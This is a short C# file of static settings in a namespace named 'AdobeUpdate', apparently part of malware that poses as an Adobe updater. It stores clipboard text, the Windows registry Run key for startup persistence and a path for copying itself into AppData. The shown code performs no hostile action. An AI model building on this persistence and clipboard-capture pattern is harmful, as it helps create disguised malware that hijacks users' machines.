﻿using System;
using System.IO;
using System.Windows.Forms;

namespace AdobeUpdate.Main
{
    public static class Assists
    {
        public static string OriginalClipboardText = "";
        public static string RegistryStartupPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        public static string ExecutableName = Path.GetFileName(Application.ExecutablePath);
        public static string NewExecutablePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ExecutableName);
    }
}
